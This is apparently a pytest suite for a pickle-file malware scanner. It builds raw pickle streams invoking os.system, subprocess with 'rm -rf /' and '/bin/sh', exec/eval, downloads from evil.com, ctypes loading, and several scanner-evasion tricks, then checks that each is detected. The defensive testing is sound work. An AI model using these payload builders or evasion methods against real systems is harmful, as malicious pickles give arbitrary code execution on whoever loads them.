"""
Pickle opcode test suite for Sentinel PickleScanner.

Tests that Sentinel detects ALL attack vectors from fickling's
pickle_scanning_benchmark, PLUS fickling-inspired structural checks
(expansion attacks, duplicate PROTO, misplaced PROTO).

Each test constructs a raw pickle byte stream with the specific
attack vector and verifies Sentinel catches it.
"""

import io
import struct

from sentinel.artifact.pickle_scanner import PickleScanner

# ── Helpers ────────────────────────────────────────────────────────

def _make_pickle_v2(module: str, name: str, *args) -> bytes:
    """Build a minimal pickle v2 that does: module.name(*args)."""
    buf = io.BytesIO()
    # PROTO 2
    buf.write(b"\x80\x02")
    # GLOBAL module\nname\n
    buf.write(b"c" + f"{module}\n{name}\n".encode())
    # MARK + args + TUPLE
    if args:
        buf.write(b"(")  # MARK
        for arg in args:
            _write_string(buf, str(arg))
        buf.write(b"t")  # TUPLE
    else:
        buf.write(b")")  # EMPTY_TUPLE
    # REDUCE
    buf.write(b"R")
    # STOP
    buf.write(b".")
    return buf.getvalue()


def _write_string(buf: io.BytesIO, s: str) -> None:
    """Write a SHORT_BINUNICODE string to the buffer."""
    encoded = s.encode("utf-8")
    if len(encoded) < 256:
        buf.write(b"\x8c")  # SHORT_BINUNICODE
        buf.write(bytes([len(encoded)]))
        buf.write(encoded)
    else:
        buf.write(b"\x8d")  # BINUNICODE
        buf.write(struct.pack("<I", len(encoded)))
        buf.write(encoded)


def _make_clean_pickle() -> bytes:
    """Build a pickle that only uses allowlisted imports."""
    buf = io.BytesIO()
    buf.write(b"\x80\x02")
    buf.write(b"ccollections\nOrderedDict\n")
    buf.write(b")")  # EMPTY_TUPLE
    buf.write(b"R")
    buf.write(b".")
    return buf.getvalue()


scanner = PickleScanner()


# ══════════════════════════════════════════════════════════════════
# TRUE POSITIVES — Must detect all fickling benchmark payloads
# ══════════════════════════════════════════════════════════════════

class TestExecPrimitives:
    """Fickling EXEC_PRIMITIVE_PAYLOADS — all must be detected."""

    def test_os_system(self):
        data = _make_pickle_v2("os", "system", "ls")
        findings = scanner.scan_bytes(data, source="test_os_system")
        assert any("os.system" in f.title for f in findings)
        assert any(f.severity.name == "CRITICAL" for f in findings)

    def test_subprocess_run(self):
        data = _make_pickle_v2("subprocess", "run", "rm -rf /")
        findings = scanner.scan_bytes(data, source="test_subprocess_run")
        assert any("subprocess.run" in f.title for f in findings)

    def test_builtins_exec(self):
        data = _make_pickle_v2("builtins", "exec", "import os")
        findings = scanner.scan_bytes(data, source="test_builtins_exec")
        assert any("builtins.exec" in f.title for f in findings)
        assert any(f.severity.name == "CRITICAL" for f in findings)

    def test_builtins_eval(self):
        data = _make_pickle_v2("builtins", "eval", "1+1")
        findings = scanner.scan_bytes(data, source="test_builtins_eval")
        assert any("builtins.eval" in f.title for f in findings)

    def test_subprocess_check_output(self):
        data = _make_pickle_v2("subprocess", "check_output", "id")
        findings = scanner.scan_bytes(data, source="test_check_output")
        assert any("subprocess.check_output" in f.title for f in findings)

    def test_subprocess_popen(self):
        data = _make_pickle_v2("subprocess", "Popen", "/bin/sh")
        findings = scanner.scan_bytes(data, source="test_popen")
        assert any("subprocess.Popen" in f.title for f in findings)

    def test_numpy_runstring(self):
        data = _make_pickle_v2(
            "numpy.testing._private.utils", "runstring",
            '__import__("os").system("ls")',
        )
        findings = scanner.scan_bytes(data, source="test_numpy_runstring")
        assert len(findings) > 0

    def test_shutil_os_system(self):
        data = _make_pickle_v2("shutil.os", "system", "ls")
        findings = scanner.scan_bytes(data, source="test_shutil_os")
        # shutil.os is an alias for os — should still detect
        assert len(findings) > 0


class TestDangerousPrimitives:
    """Fickling DANGEROUS_PRIMITIVE_PAYLOADS."""

    def test_torch_hub_load(self):
        data = _make_pickle_v2("torch.hub", "load", "evil/repo")
        findings = scanner.scan_bytes(data, source="test_torch_hub_load")
        assert any("torch.hub.load" in f.title for f in findings)

    def test_torch_load(self):
        data = _make_pickle_v2("torch", "load", "./malicious.pth")
        findings = scanner.scan_bytes(data, source="test_torch_load")
        # torch.load is NOT in blocklist (it's data deserialization)
        # but it's in the allowlist, so no finding expected
        # This is intentional — torch.load itself is the function WE are
        dangerous = [f for f in findings if "dangerous" in f.title.lower()]
        assert len(dangerous) == 0

    def test_torch_hub_download(self):
        data = _make_pickle_v2(
            "torch.hub", "download_url_to_file",
            "http://evil.com/payload.bin",
        )
        findings = scanner.scan_bytes(data, source="test_torch_hub_dl")
        assert any("torch.hub" in f.title for f in findings)


class TestCodeConstruction:
    """CodeType/FunctionType construction — fickling's most advanced check."""

    def test_codetype_detection(self):
        data = _make_pickle_v2("types", "CodeType")
        findings = scanner.scan_bytes(data, source="test_codetype")
        assert any("CodeType" in f.title for f in findings)

    def test_functiontype_detection(self):
        data = _make_pickle_v2("types", "FunctionType")
        findings = scanner.scan_bytes(data, source="test_functiontype")
        assert any("FunctionType" in f.title for f in findings)

    def test_marshal_loads(self):
        data = _make_pickle_v2("marshal", "loads")
        findings = scanner.scan_bytes(data, source="test_marshal")
        assert any("marshal.loads" in f.title for f in findings)


class TestObfuscation:
    """Obfuscation detection — base64/zlib/codecs wrappers."""

    def test_base64_decode(self):
        data = _make_pickle_v2("base64", "b64decode", "dGVzdA==")
        findings = scanner.scan_bytes(data, source="test_b64")
        assert any("obfuscation" in f.title.lower() or "base64" in f.title for f in findings)

    def test_zlib_decompress(self):
        data = _make_pickle_v2("zlib", "decompress")
        findings = scanner.scan_bytes(data, source="test_zlib")
        assert any("obfuscation" in f.title.lower() or "zlib" in f.title for f in findings)

    def test_codecs_rot13_decode(self):
        data = _make_pickle_v2("_codecs", "decode", "flfgrz", "rot_13")
        findings = scanner.scan_bytes(data, source="test_codecs_rot13")
        assert any("_codecs.decode" in f.title for f in findings)


class TestNetworkAccess:
    """Network exfiltration vectors."""

    def test_urllib_urlretrieve(self):
        data = _make_pickle_v2(
            "urllib.request", "urlretrieve",
            "http://evil.com/payload",
        )
        findings = scanner.scan_bytes(data, source="test_urllib")
        assert any("urllib" in f.title for f in findings)

    def test_socket(self):
        data = _make_pickle_v2("socket", "socket")
        findings = scanner.scan_bytes(data, source="test_socket")
        assert any("socket" in f.title for f in findings)

    def test_requests_get(self):
        data = _make_pickle_v2("requests", "get", "http://evil.com")
        findings = scanner.scan_bytes(data, source="test_requests")
        assert any("requests" in f.title for f in findings)


class TestFFI:
    """Foreign function interface — ctypes/cffi."""

    def test_ctypes_cdll(self):
        data = _make_pickle_v2("ctypes", "CDLL", "./libevil.so")
        findings = scanner.scan_bytes(data, source="test_ctypes")
        assert any("ctypes.CDLL" in f.title for f in findings)

    def test_cffi(self):
        data = _make_pickle_v2("cffi", "FFI")
        findings = scanner.scan_bytes(data, source="test_cffi")
        assert any("cffi.FFI" in f.title for f in findings)


# ══════════════════════════════════════════════════════════════════
# FICKLING-INSPIRED STRUCTURAL CHECKS
# ══════════════════════════════════════════════════════════════════

class TestExpansionAttack:
    """Billion Laughs via high GET/PUT ratio."""

    def test_high_get_put_ratio(self):
        """Construct pickle with many GETs and few PUTs."""
        buf = io.BytesIO()
        buf.write(b"\x80\x02")
        # Push a string
        _write_string(buf, "lol")
        # PUT once (BINPUT 0)
        buf.write(b"q\x00")
        # GET 15 times (BINGET 0)
        for _ in range(15):
            buf.write(b"h\x00")
        buf.write(b".")  # STOP
        data = buf.getvalue()

        analysis = scanner.raw_analysis(data)
        assert analysis.get_put_ratio >= 10
        assert analysis.has_expansion_attack is True

        findings = scanner.scan_bytes(data, source="test_expansion")
        assert any("expansion" in f.title.lower() for f in findings)


class TestDuplicateProto:
    """Duplicate PROTO opcode detection."""

    def test_duplicate_proto_detected(self):
        buf = io.BytesIO()
        buf.write(b"\x80\x02")  # PROTO 2
        _write_string(buf, "test")
        buf.write(b"\x80\x03")  # PROTO 3 (duplicate!)
        buf.write(b".")
        data = buf.getvalue()

        analysis = scanner.raw_analysis(data)
        assert analysis.has_duplicate_proto is True

        findings = scanner.scan_bytes(data, source="test_dup_proto")
        assert any("duplicate" in f.title.lower() for f in findings)


class TestMisplacedProto:
    """PROTO not at position 0."""

    def test_misplaced_proto(self):
        buf = io.BytesIO()
        # Start with a MARK instead of PROTO
        buf.write(b"(")  # MARK
        buf.write(b"\x80\x02")  # PROTO at position 1 (misplaced!)
        buf.write(b".")
        data = buf.getvalue()

        # pickletools may or may not parse this correctly
        # but we should detect it via raw analysis
        analysis = scanner.raw_analysis(data)
        # The first opcode is MARK, not PROTO
        if analysis.has_misplaced_proto:
            findings = scanner.scan_bytes(data, source="test_misplaced")
            assert any("misplaced" in f.title.lower() for f in findings)


# ══════════════════════════════════════════════════════════════════
# FALSE POSITIVE TESTS — must NOT fire on clean models
# ══════════════════════════════════════════════════════════════════

class TestAllowlist:
    """Verify that allowlisted imports produce zero findings."""

    def test_collections_ordereddict(self):
        data = _make_clean_pickle()
        findings = scanner.scan_bytes(data, source="test_clean")
        dangerous = [f for f in findings if "dangerous" in f.title.lower()]
        assert len(dangerous) == 0

    def test_torch_rebuild_tensor(self):
        data = _make_pickle_v2("torch._utils", "_rebuild_tensor_v2")
        findings = scanner.scan_bytes(data, source="test_rebuild")
        dangerous = [f for f in findings if "dangerous" in f.title.lower()]
        assert len(dangerous) == 0

    def test_numpy_reconstruct(self):
        data = _make_pickle_v2("numpy.core.multiarray", "_reconstruct")
        findings = scanner.scan_bytes(data, source="test_numpy")
        dangerous = [f for f in findings if "dangerous" in f.title.lower()]
        assert len(dangerous) == 0

    def test_copyreg_reconstructor(self):
        data = _make_pickle_v2("copyreg", "_reconstructor")
        findings = scanner.scan_bytes(data, source="test_copyreg")
        dangerous = [f for f in findings if "dangerous" in f.title.lower()]
        assert len(dangerous) == 0

    def test_sklearn_wildcard(self):
        data = _make_pickle_v2(
            "sklearn.ensemble._forest", "RandomForestClassifier"
        )
        findings = scanner.scan_bytes(data, source="test_sklearn")
        dangerous = [f for f in findings if "dangerous" in f.title.lower()]
        assert len(dangerous) == 0

    def test_builtins_safe_set(self):
        data = _make_pickle_v2("builtins", "set")
        findings = scanner.scan_bytes(data, source="test_set")
        dangerous = [f for f in findings if "dangerous" in f.title.lower()]
        assert len(dangerous) == 0

    def test_zlib_compress(self):
        data = _make_pickle_v2("zlib", "compress", "payload")
        findings = scanner.scan_bytes(data, source="test_zlib_compress")
        assert findings == []

    def test_operator_itemgetter_not_near_miss_fp(self):
        data = _make_pickle_v2("operator", "itemgetter", 0)
        findings = scanner.scan_bytes(data, source="test_operator_itemgetter")
        assert all(f.rule_id != "ARTIFACT-041" for f in findings)


# ══════════════════════════════════════════════════════════════════
# EVASION RESISTANCE — things fickling catches, so must we
# ══════════════════════════════════════════════════════════════════

class TestEvasionResistance:
    """Evasion techniques that bypass naive scanners."""

    def test_mlflow_rce(self):
        """CVE-style: mlflow.projects.backend.local._run_entry_point"""
        data = _make_pickle_v2(
            "mlflow.projects.backend.local", "_run_entry_point"
        )
        findings = scanner.scan_bytes(data, source="test_mlflow")
        assert len([f for f in findings if "dangerous" in f.title.lower()]) > 0

    def test_cloudpickle_builtin_type(self):
        """cloudpickle._builtin_type can construct CodeType."""
        data = _make_pickle_v2("cloudpickle.cloudpickle", "_builtin_type")
        findings = scanner.scan_bytes(data, source="test_cloudpickle")
        assert len([f for f in findings if "dangerous" in f.title.lower()]) > 0

    def test_operator_attrgetter(self):
        """operator.attrgetter('system')(__import__('os'))('echo pwned')"""
        data = _make_pickle_v2("_operator", "attrgetter", "system")
        findings = scanner.scan_bytes(data, source="test_attrgetter")
        assert len([f for f in findings if "dangerous" in f.title.lower()]) > 0

    def test_pkgutil_resolve_name(self):
        """pkgutil.resolve_name bypasses entire blocklist."""
        data = _make_pickle_v2("pkgutil", "resolve_name", "os:system")
        findings = scanner.scan_bytes(data, source="test_pkgutil")
        assert len([f for f in findings if "dangerous" in f.title.lower()]) > 0

    def test_multiprocessing_passfds(self):
        """multiprocessing.util.spawnv_passfds — direct exec bypass."""
        data = _make_pickle_v2(
            "multiprocessing.util", "spawnv_passfds"
        )
        findings = scanner.scan_bytes(data, source="test_spawnv")
        assert len([f for f in findings if "dangerous" in f.title.lower()]) > 0

    def test_mutated_dangerous_global_near_miss(self):
        """Mutated GLOBAL names followed by REDUCE should not evade matching."""
        data = _make_pickle_v2("os", "qystem", "id")
        findings = scanner.scan_bytes(data, source="test_mutated_os_system")
        assert any(f.rule_id == "ARTIFACT-041" for f in findings)

    def test_pickletools_crash_evasion(self):
        """Pickle with invalid opcodes after REDUCE — should trigger fallback."""
        buf = io.BytesIO()
        buf.write(b"\x80\x02")
        buf.write(b"cos\nsystem\n")
        buf.write(b"(")
        _write_string(buf, "whoami")
        buf.write(b"tR")  # TUPLE + REDUCE
        # Corrupt bytes after REDUCE to crash pickletools on second parse
        buf.write(b"\xff\xff\xff\xff")
        data = buf.getvalue()

        findings = scanner.scan_bytes(data, source="test_crash_evasion")
        # Should find os.system even if pickletools partially crashes
        assert len(findings) > 0


class TestIntrospectionChain:
    """__subclasses__ → __builtins__ → eval chaining."""

    def test_getattr_chain(self):
        data = _make_pickle_v2("builtins", "getattr")
        findings = scanner.scan_bytes(data, source="test_getattr")
        assert any("dangerous" in f.title.lower() for f in findings)

    def test_import_chain(self):
        data = _make_pickle_v2("builtins", "__import__", "os")
        findings = scanner.scan_bytes(data, source="test_import")
        assert any("dangerous" in f.title.lower() for f in findings)
